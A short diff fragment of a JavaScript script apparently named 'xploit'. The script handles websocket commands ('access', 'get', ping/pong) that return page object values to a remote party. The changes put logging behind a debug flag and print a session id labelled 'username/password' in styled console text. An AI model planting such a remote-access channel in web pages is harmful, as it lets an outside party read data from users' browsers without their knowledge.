@@ -91,10 +91,10 @@
             if(debug)console.log("< access res",res);
             xploit.sock.send("access"+JSON.stringify({json:res,string:String(res)}));
         }else if(str.startsWith("ping")){
-            console.log("> ping");
+            if(debug)console.log("> ping");
             xploit.sock.send(str.replace("ping","pong"));
         }else if(str.startsWith("pong")){
-            console.log("> pong");
+            if(debug)console.log("> pong");
         };
     }
 
@@ -111,6 +111,10 @@
         else if(j.action[0]=="get")return obj[j.prop[j.prop.length-1]]; // do something
         else return null;
     };
+
+    if(debug)console.log("uid",uid);
+    if(!debug)console.log("gebruikersnaam/wachtwoord: "+uid);
+    if(!debug)console.log("%c"+uid, "color: blue; font-size: 30px; font-weight: bold;");
 
     if(debug)globalThis.xploit=xploit;
     return debug?xploit:xploit.version;
